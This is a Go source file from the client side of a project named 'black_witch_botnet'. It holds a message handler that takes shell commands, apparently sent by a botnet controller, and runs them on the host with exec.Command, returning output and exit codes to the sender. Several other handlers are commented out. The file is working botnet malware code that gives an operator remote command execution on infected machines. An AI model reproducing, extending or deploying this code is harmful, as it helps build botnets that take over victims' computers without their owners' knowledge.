package client

import (
	"os/exec"
	"black_witch_botnet/relations"
	"strings"
)

type Handler struct {
	Message interface{}
}

func (h *Handler) handle() interface{} {
	// messages EventMessage, ShellCommand
	// res ErrorResult, EventResult, ShellResult

	if req, ok := h.Message.(*relations.ShellCommand); ok {
		return h.handleShell(req)
	}

	//if req, ok := h.Message.(*relations.EventMessage); ok {
	//	return h.handleEvent(req)
	//}

	res := &relations.ErrorResult{
		Code: relations.ErrorUnknownRequest,
		Data: []byte("unknown request"),
	}

	return res
}

func (h *Handler) handleShell(req *relations.ShellCommand) interface{} {
	switch req.Type {
	case relations.ShellTypeExec:
		return h.execShell(req)
	//case relations.ShellTypeChangeDir:
	//	return h.changeDirShell(req)
	default:
		return &relations.ErrorResult{
			Code: relations.ErrorUnknownShellType,
			Data: []byte("unknown request"),
		}
	}
}

//func (h *Handler) handleEvent(req *relations.EventMessage) interface{} {
//
//}

func (h *Handler) execShell(req *relations.ShellCommand) interface{} {
	data := strings.Split(string(req.Data), " ")
	cmd := data[0]
	args := append(data[:0], data[0+1:]...)

	e := exec.Command(cmd, args...)
	o, err := e.Output()

	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			res := &relations.ShellResult{
				Exit:   ee.ExitCode(),
				Stderr: ee.Stderr,
			}

			return res
		}

		req := &relations.ErrorResult{
			Code: relations.ErrorCommand,
			Data: []byte(err.Error()),
		}

		return req
	}

	res := &relations.ShellResult{
		Exit:   0,
		Stdout: o,
	}

	return res
}

//func (h *Handler) changeDirShell(req *relations.ShellCommand) interface{} {
//
//}
